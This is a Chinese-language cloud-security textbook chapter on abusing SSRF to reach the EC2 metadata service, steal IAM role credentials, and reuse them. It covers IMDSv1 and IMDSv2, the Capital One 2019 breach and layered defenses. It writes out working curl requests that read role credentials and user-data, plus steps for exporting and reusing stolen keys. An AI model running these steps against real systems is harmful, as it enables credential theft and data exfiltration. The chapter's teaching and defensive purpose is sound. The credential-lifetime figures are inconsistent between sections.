# Ch 10 — EC2 與 metadata SSRF：偷憑證的經典鏈

> **目標**：把 SSRF（Server-Side Request Forgery，伺服器端請求偽造）→ IMDS → 拿 role 臨時憑證這條攻擊鏈完整跑一遍，理解 IMDSv1/v2 對可利用性的差異，透過 Capital One 2019 案例看清真實後果，並給出足夠具體的防禦措施。
>
> **環境**：本章大量指令需在 EC2 instance 內部執行，或透過 SSRF payload 中繼。凡需真實帳號的段落標 **本段未實測，為理論預期行為**，並附自驗方法。AWS CLI v2，指令在 Linux shell 測試；純 CLI 模擬段落（export 環境變數、JSON 格式驗證）可在本機跑。

Ch 5 已把 IMDSv1/v2 的結構和憑證格式講清楚了。這一章不重複基礎，直接切入攻擊視角：SSRF 漏洞為什麼能讓外部攻擊者「變成」EC2 上的 IAM role，這條鏈到底有幾步，Capital One 為什麼賠了 2.7 億美元，以及什麼樣的防禦才算有效。

---

## 為什麼這條鏈是雲端最經典的 exploit

傳統 web SSRF 的戰果通常有限——打進內網、掃服務、偶爾打到 Redis 之類的未認證服務。但在 AWS EC2 上，SSRF 的天花板高得多，原因是三個條件同時滿足：

**第一，EC2 有個特殊位址 `169.254.169.254`**，這是 link-local（鏈路本地）位址，只在 EC2 instance 內部可達，外部網路無法直接打過來。IMDS 跑在這裡，EC2 靠它拿自己的 metadata、role 名稱、臨時憑證。

**第二，IAM role 的設計讓憑證必須放在 IMDS 裡**。EC2 不能把長期 access key 硬寫進去（那更糟），所以 STS 發給 instance 的臨時憑證放在 `169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`，讓 instance 上的 SDK 去撈。只要能打到這個位址，就能拿到完整三件組：`AccessKeyId`、`SecretAccessKey`、`SessionToken`。

**第三，SSRF 把 EC2 當代理用**。攻擊者沒辦法直接打 `169.254.169.254`（那是 link-local，封包根本送不到），但如果 EC2 上的 web app 有 SSRF 漏洞，攻擊者讓 **app 自己** 去打——app 跑在 EC2 內部，打得到。整個鏈不需要任何 RCE，不需要提權，不需要寫殼，一個 SSRF 加上 app 掛著有 IAM role，就夠了。

這條鏈的殺傷力在於終點：拿到臨時憑證後，攻擊者在自己本機 export 環境變數，完全「變成」那個 role，之後在 AWS 帳號裡的橫向移動、資料外洩，都是正常的 AWS API 呼叫，跟攻擊者自己的身分無關。

---

## 先建直覺：SSRF 讓你借用 EC2 的腿

SSRF 的本質是「我叫你幫我抓一個 URL」。在正常功能裡，這可能是 app 的截圖服務、PDF 產生器、webhook 測試器。關鍵是：app 代你發的 HTTP 請求，帶的是 app 自己的網路身分，從 EC2 內部發出去。

```
外部網路                   VPC（EC2 內部）                  AWS 基礎設施

[攻擊者]                [受害 web app]                 [IMDS 169.254.169.254]
    │                        │                                │
    │  1. 傳入 SSRF payload   │                                │
    │  ?url=http://169.254…  │                                │
    ├───────────────────────▶│                                │
    │                        │   2. app 幫你發 HTTP GET        │
    │                        ├───────────────────────────────▶│
    │                        │                                │
    │                        │   3. IMDS 回傳 role 名稱        │
    │                        │◀───────────────────────────────┤
    │  4. app 把回應轉給你    │                                │
    │◀───────────────────────┤                                │
    │                        │                                │
    │  5. 拿到 role 名稱      │                                │
    │  再送一次 payload       │                                │
    ├───────────────────────▶│                                │
    │                        ├───────────────────────────────▶│
    │                        │◀───────────────────────────────┤
    │◀───────────────────────┤   (回傳 JSON 憑證)              │
    │                        │                                │
    ▼                        
[攻擊者本機]
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity  # 現在你是那個 role
```

攻擊者從頭到尾沒有碰過 EC2 instance，沒有 SSH，沒有 RCE，只有兩個 HTTP 請求。

---

## 完整攻擊鏈，逐步拆解

### Step 1：找到 SSRF 入口

常見形式：
- `?url=https://example.com/image.png`（圖片代理、截圖服務）
- `?webhook=https://target.example.com/hook`（webhook 測試、通知設定）
- `?redirect=https://...`（open redirect 之後被 server-side follow）
- `?report=https://...`（PDF/報表產生器）
- GraphQL 或 XML 解析中帶 external entity（XXE 的 SSRF 變體）

確認是 server-side 的關鍵：回應裡出現了目標 server 的內容，而不是瀏覽器自己去抓的。

### Step 2：確認 EC2 環境

在打 IMDS 前，先確認是不是跑在 EC2 上。可以用 SSRF 打幾個 metadata 端點測試：
```
http://169.254.169.254/latest/meta-data/
```
如果有回應，這台機器是 EC2（或有 IMDS 的 AWS 服務）。

### Step 3：拿 role 名稱（IMDSv1）

**本段未實測，為理論預期行為。**

```bash
# payload 塞進 SSRF 的 url 參數
# 等同於：在 EC2 內部執行
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

成功回應範例（只有 role 名稱，純文字）：
```
webapp-prod-role
```

如果 instance 沒掛任何 IAM role，這個端點回 404。有掛 role 才有東西。

自驗方法：開一台 t3.micro，掛一個測試 role（權限只有 `sts:GetCallerIdentity`），SSH 進去直接跑上面的 `curl`，觀察輸出。

### Step 4：拿完整臨時憑證

**本段未實測，為理論預期行為。**

```bash
# 用拿到的 role 名稱組成完整路徑
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-prod-role
```

回應是一個 JSON：
```json
{
  "Code" : "Success",
  "LastUpdated" : "2024-01-15T10:23:45Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAEXAMPLE1234567890",
  "SecretAccessKey" : "exampleSecretKeyABCDEFGHIJKLMNOPQRSTUVWXYZ",
  "Token" : "exampleSessionTokenLongStringGoesHere...",
  "Expiration" : "2024-01-15T16:23:45Z"
}
```

`Code: Success` 表示拿到了。`Expiration` 是過期時間，預設約 6 小時，但在 instance 還活著時 IMDS 會自動 rotate，攻擊者在這段時間內可以多次更新。

### Step 5：在本機使用憑證

這一步在本機就能驗（格式驗證不需要真實憑證）：

```bash
# 從 EC2 上的 SSRF 撈到 JSON 後，解析並 export（示意）
# 假值，實際操作時換成真實的三件組
export AWS_ACCESS_KEY_ID="ASIAEXAMPLE1234567890"
export AWS_SECRET_ACCESS_KEY="exampleSecretKeyABCDEFGHIJKLMNOPQRSTUVWXYZ"
export AWS_SESSION_TOKEN="exampleSessionTokenLongStringGoesHere"

# 確認 CLI 認到的身分（需要真實憑證才能成功，示意）
aws sts get-caller-identity
```

真實回應長這樣：
```json
{
    "UserId": "AROA1234567890EXAMPLE:i-1234567890abcdef0",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/webapp-prod-role/i-1234567890abcdef0"
}
```

`Arn` 裡的 `assumed-role/webapp-prod-role` 告訴你現在是哪個 role。之後不管發什麼 API 呼叫，AWS 都認為這是那個 role 在操作，攻擊者的本機身分完全抹掉。

---

## IMDSv1 vs IMDSv2 對可利用性的影響

Ch 5 介紹了 v1/v2 的結構差異，這裡從攻擊者視角看清楚「哪種 SSRF 能打哪種 IMDS」。

### IMDSv2 的防禦機制

IMDSv2 要求兩步驟：

```bash
# Step 1：PUT 請求拿 token（TTL 最短 1 秒，最長 21600 秒）
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2：帶 token 的 GET
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/")

curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}"
```

這個設計攔掉了什麼：
- **GET-only 的 SSRF**：多數 server-side URL fetch library 預設只發 GET，PUT 發不出去
- **不能帶自訂 header 的 SSRF**：很多 SSRF 漏洞只能控制 URL，header 是固定的
- **hop limit = 1**：TTL 設定讓跨一個網路跳點的封包被丟棄，擋掉容器 → 宿主機的路徑（預設情況下）

### IMDSv2 擋不住什麼

```
┌─────────────────────────────────────────────────────────────┐
│               IMDSv2 仍然可被繞過的情境                       │
├─────────────────────────────────────────────────────────────┤
│  SSRF 能控制 HTTP method（curl SSRF、某些 HTTP client）       │
│    → 攻擊者可以發 PUT                                         │
│                                                             │
│  SSRF 後面跟著 open redirect（redirect 到 169.254...）        │
│    → server follow redirect 時等同 EC2 本機發出請求           │
│                                                             │
│  直接 RCE（SSRF 是跳板，真正打到了 shell）                     │
│    → shell 在 EC2 內，直接打 curl，v2 完全沒障礙              │
│                                                             │
│  容器環境 hop limit 被調到 2                                  │
│    → 容器內的 SSRF 可以越過一跳打到宿主機 IMDS               │
│                                                             │
│  instance 設了 http-tokens=optional（預設值！）               │
│    → v1 仍然可用，根本繞不了                                  │
└─────────────────────────────────────────────────────────────┘
```

### 最大的坑：`optional` ≠ 防禦

這是現實中最常見的誤解。在 EC2 console 或 Terraform 裡你可能看到「已啟用 IMDSv2」，但如果設定是：

```
IMDSv2: Optional
```

這代表 v1 和 v2 都能用，v1 仍然是一個 GET 打到底，SSRF 完全可以利用。**只有 `required` 才算真防禦**——設成 required 後，v1 的請求直接回 401，v2 token 沒帶的 GET 也被擋。

---

## user-data 洩漏

除了 IAM 憑證，SSRF 還能打 user-data（用戶數據）端點。user-data 是 EC2 launch 時塞進去的 bootstrap 腳本，常見內容：

- 硬編碼的 `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY`（長期 key，比 role 憑證更糟）
- 資料庫連線字串、Redis 密碼
- Slack webhook URL、API token
- 內網服務的 hostname、IP 段

**本段未實測，為理論預期行為。** 攻擊者用 SSRF 打這個端點：

```bash
# IMDSv1（一個 GET 就有）
curl http://169.254.169.254/latest/user-data

# IMDSv2（需要先拿 token）
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/user-data
```

如果 instance launch 時沒塞 user-data，端點回 404，這是正常結果。

自驗方法：開 t3.micro 時在「User data」欄位填入一段假腳本（例如 `#!/bin/bash\necho "DB_PASS=test123"`），SSH 進去後執行 `curl http://169.254.169.254/latest/user-data`，確認能把自己塞進去的腳本讀回來。再用同一台機器模擬 SSRF：開一個 `python3 -m http.server` 加上簡單的 proxy，從外面打進來觀察整條路徑。

---

## Capital One 2019：完整技術復盤

> **本段技術細節基於公開調查報告與資安研究員還原，SSRF 可利用性與 role 過度授權為確認事實，操作細節為技術推斷。**

2019 年 7 月，美國第一資本金融公司（Capital One）遭遇了雲端史上損失最慘重的資料外洩事件之一。攻擊者 Paige Thompson（前 AWS 工程師）的完整技術路徑如下：

### 環境背景

Capital One 在 AWS 上架設了 WAF（Web Application Firewall，網頁應用程式防火牆）伺服器，跑在 EC2 instance 上。這台 EC2 掛著一個 IAM role，這個 role 被授予了對大量 S3 bucket 的 `s3:GetObject` 和 `s3:ListBucket` 權限，涵蓋幾乎所有業務資料的 bucket。

### 攻擊路徑

```
1. SSRF 入口
   │
   │  WAF 伺服器有一個設定錯誤，導致攻擊者能透過特製請求
   │  讓 WAF 代為發出 HTTP 請求到任意位址。
   ▼

2. 打 IMDS
   │
   │  payload：GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
   │  → WAF 是 EC2，從 EC2 內部打 IMDS，IMDSv1 一個 GET 沒有障礙
   │  → 回傳 role 名稱
   ▼

3. 拿臨時憑證
   │
   │  payload：GET http://169.254.169.254/.../security-credentials/<role-name>
   │  → 拿到 ASIA... AccessKeyId + SecretAccessKey + SessionToken
   ▼

4. 在攻擊者本機 export 憑證
   │
   │  完全等同那個 WAF role 的身分
   ▼

5. 枚舉 S3 bucket
   │
   │  aws s3 ls（用 role 權限）→ 列出 100+ 個 bucket
   │  aws s3 cp s3://capital-one-xxx/ ...（批次下載）
   ▼

6. 外洩 1 億筆個資
   │
   │  美國超過 1 億位信用卡申請人的姓名、地址、信用分數、
   │  部分社會安全碼、銀行帳戶資訊
   ▼

7. 事後
   │
   │  攻擊者在 GitHub 上貼出部分資料（匿名，但被追溯）
   │  FBI 在案發約三週後逮捕
   │  Capital One 支付約 1.9 億美元和解金 + 監管罰款
   │  加計修補、律師費、信用監控費用，總損失估計超過 2.7 億美元
```

### 四條技術教訓

1. **IMDSv1 沒禁，SSRF 一步到位**：2019 年當時 AWS 對 IMDSv2 的推廣還不強烈，IMDSv1 是預設且沒有辦法帳號級強制關閉，任何有 SSRF 的 EC2 都是活靶。

2. **WAF 的 role 過度授權**：WAF/反向代理的功能不需要存取 S3，更不需要 `s3:GetObject` on `arn:aws:s3:::*`（全帳號所有 bucket）。最小權限原則的核心：role 的 IAM policy 只能放它真正需要的動作和資源。

3. **沒有 S3 VPC Endpoint + 出口流量限制**：攻擊者拿到憑證後，在自己本機發 `aws s3 cp` 指令下載資料。如果 Capital One 設了 S3 bucket policy 強制要求只接受來自特定 VPC 的請求（VPC endpoint condition），攻擊者的本機呼叫會直接被 bucket policy 擋掉，即使有憑證也取不到資料。

4. **GuardDuty 有 finding，但回應流程沒到位**：AWS GuardDuty（威脅偵測服務）有偵測到異常的 API 呼叫（大量 S3 操作、來自非預期 IP），但 Capital One 的 SOC 回應流程沒有在第一時間處理這些 finding。技術防禦有了，但人跟流程的部分斷掉了。

---

## 具體可跑範例

### 範例 A：IMDSv1 完整流程（EC2 內部）

**本段未實測，為理論預期行為。**

```bash
# 在 EC2 instance 上執行，或透過 SSRF payload 等效觸發

# Step 1：確認 IMDS 可達，拿 role 名稱
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 預期輸出：webapp-prod-role

# Step 2：拿完整憑證 JSON
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-prod-role
# 預期輸出：{"Code":"Success","AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}
```

### 範例 B：IMDSv2 完整流程（EC2 內部）

**本段未實測，為理論預期行為。**

```bash
# PUT 拿 token，帶 token 的 GET 拿憑證
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/")

curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}"
```

### 範例 C：失敗案例——在強制 IMDSv2 的 instance 上用 v1 打

**本段未實測，為理論預期行為。**

```bash
# 已設定 http-tokens=required 的 instance 上，直接打 v1
curl -v http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 預期回應：
# HTTP/1.1 401 Unauthorized
# 回應 body 為空或含 "unauthorized" 訊息
```

這個 401 就是 IMDSv2 `required` 模式的防禦效果。v1 的 GET 請求完全被擋，不需要帶 token 的請求一律拒絕。注意：如果設的是 `optional` 而非 `required`，這個 GET 仍然會成功回應——這是最常見的誤設。

### 範例 D：拿到憑證後在本機使用（本機可跑）

JSON 格式驗證在本機直接跑，不需要真實 EC2：

```bash
# 模擬從 SSRF 拿到的 JSON 回應，用 jq 解析（假值）
echo '{
  "Code": "Success",
  "AccessKeyId": "ASIAEXAMPLE1234567890",
  "SecretAccessKey": "exampleSecretKeyABCDEFGHIJKLMNOPQRSTUVWXYZ",
  "Token": "exampleSessionToken",
  "Expiration": "2024-01-15T16:23:45Z"
}' | jq '{
  key: .AccessKeyId,
  expires: .Expiration,
  is_temporary: (.AccessKeyId | startswith("ASIA"))
}'
```

本機可驗輸出：
```json
{
  "key": "ASIAEXAMPLE1234567890",
  "expires": "2024-01-15T16:23:45Z",
  "is_temporary": true
}
```

`is_temporary: true` 確認前四碼是 `ASIA`，這是 role 臨時憑證。接下來 export 三個環境變數後，`aws sts get-caller-identity` 就能確認身分（需要真實有效憑證才能成功）。

---

## 防禦側：怎麼讓這條鏈斷掉

### 1. 強制 IMDSv2 Required

**本段未實測，語法來自 AWS 官方文件，需真實帳號驗證。**

對現有 instance 修改：
```bash
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \
  --http-endpoint enabled \
  --region ap-northeast-1
```

Launch 新 instance 時預設強制：
```bash
aws ec2 run-instances \
  --image-id ami-xxxxx \
  --instance-type t3.micro \
  --metadata-options "HttpTokens=required,HttpEndpoint=enabled" \
  --region ap-northeast-1
```

帳號層級的預防（用 AWS Config rule 偵測違規）：
```bash
# 啟用 managed config rule
aws configservice put-config-rule --config-rule '{
  "ConfigRuleName": "ec2-imdsv2-check",
  "Source": {
    "Owner": "AWS",
    "SourceIdentifier": "EC2_IMDSV2_CHECK"
  }
}'
```

這個 Config rule 會把所有 `http-tokens=optional` 的 instance 標為不合規。

### 2. 最小權限 role

WAF、反向代理、負載平衡器的 EC2 role，不應該有 `s3:GetObject`、`s3:ListBucket`、`ec2:Describe*` 這類橫向存取權限。每個 instance 的 role 只給它真正需要的動作，限定到最小的資源範圍：

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject"],
      "Resource": "arn:aws:s3:::my-specific-bucket/webapp-assets/*"
    }
  ]
}
```

不是 `arn:aws:s3:::*`，而是具體的 bucket 和路徑前綴。

### 3. S3 bucket policy 綁 VPC endpoint

即使攻擊者拿到憑證，若 bucket policy 要求請求必須來自特定 VPC endpoint，攻擊者在外部發的呼叫直接被 bucket policy 擋掉：

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::my-critical-bucket",
        "arn:aws:s3:::my-critical-bucket/*"
      ],
      "Condition": {
        "StringNotEquals": {
          "aws:SourceVpc": "vpc-1234567890abcdef0"
        }
      }
    }
  ]
}
```

這層防禦的價值在於：它讓「憑證被偷」和「資料被偷」之間斷開。拿到憑證不等於拿到資料。

### 4. Security Group + VPC egress 限制

EC2 的出口流量應該受限，不允許對任意 internet IP 發出 API 呼叫。Web app 的 security group 只開它真正需要的 outbound port/destination（HTTPS 到特定 SaaS endpoint，而不是 `0.0.0.0/0`）。

---

## 對比取捨：IMDSv1 vs IMDSv2 攻防矩陣

| 面向 | IMDSv1 | IMDSv2 |
|------|--------|--------|
| 拿憑證的步驟 | 1 個 GET | PUT 拿 token + 帶 token 的 GET |
| SSRF GET-only 能打？ | 能 | 不能（PUT 被攔） |
| 需要自訂 header？ | 不需要 | 需要（擋掉多數 SSRF） |
| Hop limit | 無限制 | 預設 1（跨網路跳點死） |
| 容器環境（limit 調成 2） | 可打 | 容器內 SSRF 也可打 |
| `optional` 模式 | 可打 | v1 仍可打，無防護 |
| `required` 模式 | 被擋（401） | 唯一有效防禦 |
| SSRF 能控制 method 時 | 可打 | 仍可打（can PUT） |
| 直接 RCE 時 | 可打 | 仍可打（shell 在 EC2 內） |
| Capital One 2019 | 被打到 | 若有 required，不成立 |

結論：IMDSv2 把「隨便一個 GET-only SSRF」的利用難度大幅提升，但不是 100% 防禦。`required` 是前提條件，最小權限 role 是縱深。

---

## 踩雷集錦

**錯誤直覺：只要啟用 IMDSv2 就安全了**
→ 正確認識：啟用 IMDSv2 預設是 `optional` 模式，v1 仍然可用，SSRF 完全打得到。只有設成 `required` 才讓 v1 請求回 401。你必須明確把 `http-tokens` 設成 `required`，不是打開 IMDSv2 就算完成。

**錯誤直覺：SSRF 打到 IMDS 只能讀 metadata，拿不到真正的 AWS 操作權限**
→ 正確認識：IMDS 回傳的 `AccessKeyId + SecretAccessKey + Token` 三件組就是完整有效的 STS 臨時憑證，和 EC2 上的 SDK 用的完全一樣。攻擊者 export 這三個環境變數後，`aws` CLI 的每一個呼叫 AWS 都認為是那個 role 發出的，完全等效。

**錯誤直覺：Hop limit = 1 讓容器打不到 IMDS，容器環境安全**
→ 正確認識：預設 hop limit 是 1，但 EKS/ECS 等容器部署文件常建議把 limit 調到 2 讓容器能存取 IMDS，這讓容器內的 SSRF 重新可以打到宿主機 IMDS。容器環境要額外確認 hop limit 的設定，並評估是否真的需要讓容器直接存取 IMDS（或改用 IRSA/EKS Pod Identity）。

**錯誤直覺：拿到的 ASIA 憑證很快過期，攻擊者沒時間用**
→ 正確認識：臨時憑證預設 1 小時，上限 12 小時。一小時對於自動化攻擊腳本足夠枚舉所有 S3 bucket、外洩幾個 GB 的資料。而且只要 instance 還活著，攻擊者可以再打一次 SSRF 拿新憑證，持續保持存取。

**錯誤直覺：這是 2019 年的老問題，現在 AWS 預設都有保護**
→ 正確認識：AWS 直到 2022 年才把「新建帳號的新 instance 預設 IMDSv2 required」這個設定推出，而且只適用於新帳號的新 instance。2022 年前建立的帳號、在新帳號裡啟動的舊 AMI、Terraform/CloudFormation 沒有指定 metadata options 的部署，全都可能跑在 v1 或 optional 模式。存量環境需要主動盤點和修改。

---

## 進階延伸

- **EC2 IMDSv2 的 header forwarding 陷阱**：某些反向代理（Nginx、Traefik）會把 client 送來的 header 原封不動 forward 到 backend，包括 `X-Forwarded-For`。但如果設定錯誤讓自訂 header 穿透，攻擊者可以在 SSRF payload 裡帶 `X-aws-ec2-metadata-token: 攻擊者偽造的token`——這個本身沒用（token 是 PUT 換來的，IMDS 會驗），但理解 header forward 的範圍是設定稽核的必要功課。

- **IMDS 的其他端點**：除了 IAM 憑證，IMDS 還能拿到 instance ID、AMI ID、安全群組、VPC CIDR、placement 區域、SSH public key（`/latest/meta-data/public-keys/`）等。SSH public key 的洩漏代表攻擊者知道了哪把 key 能連這台機器，配合其他漏洞有用。

- **SSRF 到 IMDSv2 的自動化工具**：`ssrf-sheriff`、`interactsh` 可以協助偵測 blind SSRF，`Burp Collaborator` 是商業版選項。確認 SSRF 存在後，`metadata-attacker`（GitHub 上有數個同名 PoC）自動化了打 IMDS 的流程。

- **AWS Config + Security Hub 組合偵測**：`ec2-imdsv2-check` Config rule + Security Hub 的「EC2.8」控制項，可以持續稽核帳號內的 IMDSv2 合規狀態，不合規的 instance 自動告警。這是偵測層，但不能替代修補。

- **EKS/ECS 的 IRSA 與 Pod Identity**：如果是容器化工作負載，EKS 有 IRSA（IAM Roles for Service Accounts）和較新的 Pod Identity，讓 Pod 直接綁 IAM role 而不走 node 的 IMDS。這樣即使 node 的 IMDS 被打到，拿到的是 node 的 role 而不是 Pod 用的 role，權限分離更乾淨。

---

## 本章重點整理

- SSRF 在 EC2 環境的危險性遠超傳統內網場景，因為 `169.254.169.254` 直接給出 IAM role 的臨時憑證
- 完整攻擊鏈：SSRF 入口 → 打 IMDS 拿 role 名稱 → 拿三件組憑證 → export 環境變數 → 完全等同那個 role 的操作權限
- IMDSv1 是一個 GET 就給，任何 GET-only SSRF 可打；IMDSv2 要 PUT + 自訂 header，大幅提升難度但不是零風險
- **`optional` 沒有防禦效果，`required` 才算真防禦**；這是現實中最大的誤解
- Capital One 2019：IMDSv1 未禁 + 過度授權 role + 無 VPC egress 限制 + GuardDuty 回應失位，四個條件疊加造成 2.7 億美元損失
- user-data 是被低估的洩漏面，常含明文密碼和長期 access key
- 完整縱深防禦：IMDSv2 required + 最小權限 role + S3 bucket policy 綁 VPC endpoint + egress 限制

---

## 自我檢核

- [ ] 能說出 SSRF 為什麼在 EC2 環境的危害比傳統內網高一個等級
- [ ] 能手畫出攻擊鏈的五個步驟，包括攻擊者最後在哪執行指令
- [ ] 能解釋「IMDSv2 optional」和「IMDSv2 required」的差異，以及為什麼 optional 無效
- [ ] 知道 IMDSv2 的 hop limit 在容器環境的意義，以及何時會失效
- [ ] 能說出 Capital One 案例的四個技術失誤
- [ ] 知道 user-data 洩漏的 endpoint 位址，以及哪類資訊常出現在裡面
- [ ] 能說出讓「憑證被偷」和「資料被偷」之間斷開的防禦手段（bucket policy + VPC endpoint）
- [ ] 知道用什麼 AWS 服務或 CLI 指令把 instance 從 optional 改成 required

---

## 延伸閱讀

1. **AWS 官方文件：Instance metadata and user data（IMDSv2 深度說明）**
   <https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html>
   讀這個學：PUT token 的 TTL 範圍、hop limit 的確切行為、`modify-instance-metadata-options` 的完整參數，以及帳號層級預設的設定方法。跟本章的防禦指令段落直接對應。

2. **Capital One 資料外洩事件的 Senate 聽證摘要與 OCC 裁罰文件**
   <https://www.occ.gov/news-issuances/news-releases/2020/nr-occ-2020-98.html>
   讀這個學：監管機構如何評估「過度授權 IAM role」和「SSRF 防禦不足」的法律責任，理解雲端資安問題的合規後果，對照本章的技術教訓看雙線敘事。

3. **Datadog Security Labs：Bypassing IMDSv2（實驗性繞過研究）**
   <https://securitylabs.datadoghq.com/articles/bypassing-imdsv2/>
   讀這個學：header forwarding 在 Nginx/ALB 設定下如何讓 SSRF 重新可利用、open redirect chain 的實際操作，以及研究人員測試 IMDSv2 邊界的方法論。本章「IMDSv2 擋不住什麼」段落的深化版。

4. **HackTricks：AWS SSRF 與 IMDS 攻擊技術彙整**
   <https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-elb-ssm-and-more/aws-ec2-instances-ssrf>
   讀這個學：各種 SSRF 變體（URL scheme 差異、blind SSRF 偵測）在 EC2 環境的利用技巧，以及不同 SSRF 庫對 PUT 方法的支援情況，是本章攻擊面的實戰補充。

5. **AWS Security Blog：Defense in depth using IAM Access Analyzer, IMDS, and GuardDuty**
   <https://aws.amazon.com/blogs/security/defense-in-depth-open-source-multi-layer-protection-for-aws/>
   讀這個學：AWS 視角的縱深防禦組合（Access Analyzer 偵測過度授權、GuardDuty 偵測異常 API 呼叫、IMDSv2 限制攻擊面），把本章的防禦拆解組合成 AWS 原生服務的監控體系。

---

SSRF → IMDS 是利用 EC2 的 infrastructure 層拿憑證。但雲端函數（Lambda/Serverless）同樣有 IAM role、同樣有執行環境、而且比 EC2 更容易被遺忘——函數跑完就消失，沒有長期的 instance 可以盤點，role 的過度授權往往更難被發現。下一章打 Lambda。

→ [Ch 11 Serverless（Lambda）：事件注入與過度權限](./11-serverless-lambda.md)
